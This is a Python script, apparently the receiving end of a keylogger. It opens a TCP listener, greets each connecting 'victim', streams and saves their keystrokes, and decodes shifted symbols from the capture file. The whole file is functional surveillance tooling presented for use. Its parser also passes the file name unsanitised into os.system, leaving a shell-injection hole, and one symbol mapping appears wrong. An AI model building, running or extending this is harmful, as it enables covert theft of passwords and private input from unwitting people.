#!/bin/python3

import socket, sys, os

black="\033[0;30m"
red="\033[0;91m"
green="\033[0;92m"
yellow="\033[0;93m"
blue="\033[0;94m"
purple="\033[0;95m"
cyan="\033[0;36m"
white="\033[0;97m"



def usage():
	print ("Usage:\n     cran.py receiver keystrokes.txt\n     cran.py parse keystrokes.txt")
	print ("\nIf You Want To Listen On A Specific Port Use export CRAN_PORT=[port number]")
	exit(1)

if len(sys.argv) < 3:
	usage()

if sys.argv[2] != "" and sys.argv[1] == "receiver":
	save=open(sys.argv[2], "ab")
elif sys.argv[2] != "" and sys.argv[1] == "parse":
	save=open(sys.argv[2], "rb")
else:
	usage()

port = os.getenv("CRAN_PORT")
if not port:
	port = 23334
else:
	port=int(port)
def log(key):
	print (key.decode(), end="")
	save.write(key)

def receiver():
	try:
		sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		sock.bind(('0', port))
		sock.listen()
		con, host = sock.accept()
		print ("%s[CRAN]%s Victim [%s] Connected!"%(green, yellow, host[0]))
		print ("%s[CRAN]%s Keystrokes Live Stream Started!\n\n"%(green, yellow))

		while(True):
			ktx = con.recv(1)
			if not ktx:
				break
			log(ktx)
	except KeyboardInterrupt:
		print ("\n%s[CRAN]%s Saving..."%(red, yellow))
		sock.close()


def parser():
	os.system(f'cat {sys.argv[2]} | sed \'s/\\xA0\\x32/@/g;s/\\xA0\\x31/!/g;s/\\xA0\\x33/#/g;s/\\xA0\\x34/$/g;s/\\xA0\\x35/%/g;s/\\xA0\\x36/^/g;s/\\xA0\\x37/U/g;s/\\xA0\\x38/*/g;s/\\xA0\\x39/(/g;s/\\xA0\\x40/)/g;s/\\xA0//g\'')

if sys.argv[1] == "receiver" and sys.argv[2] != '':
	receiver()
elif sys.argv[1] == "parse" and sys.argv[2] != '':
	parser()
else:
	usage()
